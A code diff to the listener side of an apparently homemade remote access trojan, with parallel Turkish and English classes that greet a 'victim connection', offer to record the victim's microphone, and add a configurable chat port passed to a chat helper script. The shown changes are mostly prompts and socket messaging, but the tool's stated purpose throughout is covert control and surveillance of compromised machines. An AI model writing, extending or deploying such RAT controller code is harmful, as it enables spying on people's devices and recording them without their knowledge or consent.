@@ -36,6 +36,8 @@ class TR_Dinleyici():
             exit()
         print(Fore.GREEN+"[!]Kurban baglantisi geldi :" + str(adres)+"\n\n")
         self.Mikrofon_kaydetme_Sorusu()
+        time.sleep(1)
+        self.Chat_Port_Sorusu()
         time.sleep(2)
         self.Banner_goster()
         print(Fore.RED+"Komutlar için 'yardim' yaziniz.")
@@ -113,14 +115,30 @@ class TR_Dinleyici():
         mikrofon_secimi = input(Fore.GREEN + "Seçim?(E/H) :")
         if mikrofon_secimi == "E" or mikrofon_secimi == "e":
             self.Json_Gonder(mikrofon_secimi)
-            self.Json_Al()
+            print(Fore.BLUE+"[+]Kurbanın mikrofonu kaydedilecek.")
         elif mikrofon_secimi == "H" or mikrofon_secimi == "h":
             self.Json_Gonder(mikrofon_secimi)
-            self.Json_Al()
+            print(Fore.BLUE+"[+]Kurbanın mikrofonu kaydedilmeyecek.")
         else:
             print(Fore.YELLOW+"[-]Yanlış seçim.Lütfen tekrar seçin.")
             time.sleep(2)
             self.Mikrofon_kaydetme_Sorusu()
+
+    def Chat_Port_Sorusu(self):
+        print(Fore.RED+"[?]'sohbet' komutunu kullanmak için port numarası girmek ister misiniz?(Hayır derseniz varsayılan=5555 olarak ayarlanacak.).(E/H) :")
+        chat_port_secimi = input(Fore.GREEN+"Seçim?(E/H) :")
+        if chat_port_secimi == "E" or chat_port_secimi == "e":
+            self.chat_port = int(input(Fore.CYAN+"Sohbet portu giriniz :"))
+            self.Json_Gonder(self.chat_port)
+            print(Fore.BLUE+"[+]Sohbet portu {s_port} olarak ayarlandi.".format(s_port=str(self.chat_port)))
+        elif chat_port_secimi == "H" or chat_port_secimi == "h":
+            self.chat_port = 5555
+            self.Json_Gonder(5555)
+            print(Fore.BLUE+"[+]Sohbet portu '5555' olarak ayarlandi.")
+        else:
+            print(Fore.YELLOW+"[-]Yanlış seçim.Lütfen tekrar seçin.")
+            time.sleep(2)
+            self.Chat_Port_Sorusu()
 
     def Json_Gonder(self,bilgi):
         json_bilgisi = simplejson.dumps(bilgi)
@@ -167,7 +185,7 @@ class TR_Dinleyici():
         with open("menus/menuTR.txt","r",encoding="utf-8") as menu:
             return Fore.GREEN+menu.read()
     def Sohbet(self):
-        subprocess.Popen(["xterm", "-T", "Chat", "-hold", "-e", "python", "util/chat_listener.py"])
+        subprocess.Popen(["xterm", "-T", "Chat", "-hold", "-e", "python", "util/chat_listener.py","-ip",self.ip,"-p",str(self.chat_port)])
 
     def Dinleyici_Basla(self):
         while True:
@@ -227,6 +245,8 @@ class EN_Listener():
         print(Fore.GREEN + "[!]A victim connection came :" + str(self.address) + "\n\n")
         time.sleep(2)
         self.Mic_Record_Question()
+        time.sleep(1)
+        self.Chat_Port_Question()
         time.sleep(2)
         self.Show_Banner()
         print(Fore.RED + "For commands,use 'help' command.")
@@ -304,14 +324,30 @@ class EN_Listener():
         mic_choice = input(Fore.GREEN + "Choice?(Y/N) :")
         if mic_choice == "Y" or mic_choice == "y":
             self.Send_Json(mic_choice)
-            self.Get_Json()
+            print(Fore.BLUE+"[+]The victim's microphone recording now.")
         elif mic_choice == "N" or mic_choice == "n":
             self.Send_Json(mic_choice)
-            self.Get_Json()
+            print(Fore.BLUE+"[+]The victim's microphone will not be recorded.")
         else:
             print(Fore.YELLOW+"[-]Wrong choice.Please choose again.")
             time.sleep(2)
             self.Mic_Record_Question()
+
+    def Chat_Port_Question(self):
+        print(Fore.RED + "[?]Do you want to enter a port for 'chat' command?(If no, the adjusted default=5555).(Y/N) :")
+        chat_port_choice = input(Fore.GREEN + "Choice?(Y/N) :")
+        if chat_port_choice == "Y" or chat_port_choice == "y":
+            self.chat_port = int(input(Fore.YELLOW+"Enter a chat port :"))
+            self.Send_Json(self.chat_port)
+            print(Fore.BLUE + "[+] {s_port} is adjusted chat port.".format(s_port=str(self.chat_port)))
+        elif chat_port_choice == "N" or chat_port_choice == "n":
+            self.chat_port = 5555
+            self.Send_Json(5555)
+            print(Fore.BLUE + "[+] '5555' is adjusted chat port.")
+        else:
+            print(Fore.YELLOW + "[-]Wrong choice.Please choose again.")
+            time.sleep(2)
+            self.Chat_Port_Question()
     def Send_Json(self, data):
         json_data = simplejson.dumps(data)
         self.connection.send(json_data.encode("utf-8"))
@@ -362,7 +398,7 @@ class EN_Listener():
             return Fore.LIGHTGREEN_EX+menu.read()
 
     def Chat(self):
-        subprocess.Popen(["xterm","-T","Chat","-hold","-e","python","util/chat_listener.py"])
+        subprocess.Popen(["xterm","-T","Chat","-hold","-e","python","util/chat_listener.py","-ip",self.ip,"-p",str(self.chat_port)])
     def Start_Listener(self):
         while True:
             global command_input
